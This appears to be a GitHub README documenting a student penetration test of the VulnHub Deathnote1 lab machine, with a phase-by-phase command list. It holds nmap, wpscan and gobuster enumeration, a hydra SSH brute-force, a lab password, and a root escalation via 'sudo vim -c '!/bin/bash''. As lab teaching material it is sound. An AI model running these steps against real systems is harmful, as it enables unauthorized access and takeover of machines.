# DeathNote1
vulnhub project

## 📋 Project Overview

This repository contains the complete penetration testing assessment documentation for the **Deathnote1** vulnerable virtual machine from VulnHub. The project demonstrates a structured ethical hacking methodology, simulating real-world attack scenarios to identify and exploit system vulnerabilities in a controlled laboratory environment.

**Target**: Deathnote1 VM (VulnHub)  
**Attacker**: Kali Linux  
**Network**: Isolated private subnet (192.168.56.0/24)  
**Status**: Complete System Compromise Achieved (User → Root)

---

## 🎯 Project Objectives

- Perform structured penetration testing following the ethical hacking lifecycle
- Conduct network reconnaissance and host discovery
- Enumerate open ports and running services
- Assess WordPress-based web application vulnerabilities
- Discover hidden directories and sensitive files
- Extract and decode credential information
- Execute SSH brute-force attacks
- Gain initial user-level access
- Escalate privileges to root-level access
- Document all findings with evidence

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Nmap** | Network scanning and service enumeration |
| **WPScan** | WordPress vulnerability scanning |
| **Gobuster** | Directory and file brute-forcing |
| **Hydra** | Credential brute-force attacks |
| **SSH** | Remote access and lateral movement |
| **CyberChef** | Data decoding and analysis |
| **Base64 Utility** | Decoding encoded files |

---

## 📁 Repository Structure

`
deathnote1-pentest/
│
├── 📄 README.md                 # Project documentation
├── 📄 Seminar_Final.pdf         # Complete project report
│
├── 📂 screenshots/              # Evidence screenshots
│   ├── phase1-nmap-scan.jpeg
│   ├── phase2-gobuster.jpeg
│   ├── phase2-wpscan.jpeg
│   ├── phase2-file-extraction.jpeg
│   ├── phase3-hydra-brute.jpeg
│   ├── phase4-ssh-access.jpeg
│   ├── phase4-privilege-check.jpeg
│   ├── phase4-user-enum.jpeg
│   ├── phase4-ssh-key.jpeg
│   ├── phase5-base64-decode.jpeg
│   ├── phase5-cyberchef.jpeg
│   └── phase6-root-access.jpeg
│
├── 📂 wordlists/                # Custom wordlists
│   ├── user.txt                 # Extracted usernames
│   └── passwords.txt            # Extracted passwords
│
├── 📂 commands/                  # Command logs
│   └── commands-executed.txt    # All commands used
│
└── 📂 latex-source/              # LaTeX report source
    └── main.tex                  # Complete LaTeX code
``



## 🔍 Attack Methodology

### Phase 1: Reconnaissance
- **Network Identification**: `ifconfig` to determine attacker IP
- **Host Discovery**: `nmap -sn 192.168.56.0/24` to locate target
- **Port Scanning**: `nmap -sS -sV -sC -O -p- 192.168.56.102`
  - Open ports: 22 (SSH), 80 (HTTP)

### Phase 2: Web Enumeration
- **WordPress Analysis**: `wpscan --url http://192.168.56.102 --enumerate u,p,t`
- **Directory Brute-Forcing**: `gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt`
- **File Extraction**: Discovered sensitive files in `/uploads` directory containing credentials

### Phase 3: Exploitation
- **Credential Brute-Force**: `hydra -l light -P passwords.txt ssh://192.168.56.102`
- **Initial Access**: `ssh light@192.168.56.102` (Password: deathnote)

### Phase 4: Post-Exploitation
- **Privilege Verification**: `id` and `sudo -l`
- **User Enumeration**: Discovered secondary user 'misa' in `/home`
- **SSH Key Manipulation**: Modified `authorized_keys` for lateral movement

### Phase 5: Data Analysis
- **Base64 Decoding**: `base64 -d encoded-file.txt`
- **CyberChef Analysis**: Decoded hex and base64 encoded content

### Phase 6: Privilege Escalation
- **Sudo Misconfiguration**: `sudo -l` revealed vim execution as root
- **Root Access**: `sudo vim -c '!/bin/bash'`
- **Flag Capture**: Retrieved root flag from `/root/root.txt`

---

## 🚀 How to Reproduce

 Prerequisites
1. **VirtualBox** or **VMware** installed
2. **Kali Linux** VM (Attacker machine)
3. **Deathnote1** VM from [VulnHub](https://www.vulnhub.com/entry/deathnote-1,739/)

### Setup Instructions


# 1. Clone this repository
git clone https://github.com/sreehari-23ubc256/deathnote1-pentest.git
cd deathnote1-pentest

# 2. Configure network
# Set both VMs to Host-Only or NAT network in VirtualBox
# Verify connectivity:
ping 192.168.56.102

# 3. Follow the methodology
# Refer to commands-executed.txt for exact commands
``

### Verification Steps


# Step 1: Network scanning
nmap -sn 192.168.56.0/24

# Step 2: Port enumeration  
nmap -sV -sC -O -p- 192.168.56.102

# Step 3: Web enumeration
gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt

# Step 4: Credential brute-force
hydra -L user.txt -P passwords.txt ssh://192.168.56.102

# Step 5: SSH access
ssh light@192.168.56.102

# Step 6: Privilege escalation
sudo -l
sudo vim -c '!/bin/bash'
id  # Should show uid=0(root)
cat /root/root.txt
``

--

## 📊 Findings Summary

### Vulnerabilities Identified
| Vulnerability | Severity | Description |
|--------------|----------|-------------|
| Directory Listing Enabled | Medium | Web server exposes directory contents |
| Information Disclosure | Medium | Sensitive files in WordPress uploads |
| Weak SSH Credentials | High | Password susceptible to brute-force |
| Improper SSH Key Config | Medium | Unauthorized key manipulation possible |
| Sudo Misconfiguration | Critical | Excessive sudo privileges for vim |

### Achievements
- ✅ Target system identified within subnet
- ✅ Open ports (22,80) enumerated
- ✅ WordPress version and plugins identified
- ✅ Hidden directories discovered
- ✅ Credential files extracted and decoded
- ✅ SSH brute-force successful
- ✅ User-level access obtained
- ✅ Root-level access achieved
- ✅ Full system compromise demonstrated

---


### Report Sections
- Introduction & Background
- Objectives
- Scope and Deliverables
- System Architecture
- Detailed Methodology (6 phases)
- Project Activities
- Results and Findings
- Advantages, Challenges, Limitations
- Conclusion
- Appendix (Tools, Commands, Vulnerabilities)

---

## 🎓 Learning Outcomes

- Practical understanding of penetration testing lifecycle
- Hands-on experience with industry-standard security tools
- Techniques for web application enumeration
- Credential brute-forcing methodologies
- Privilege escalation vectors in Linux systems
- Data decoding and analysis techniques
- Professional security documentation standards



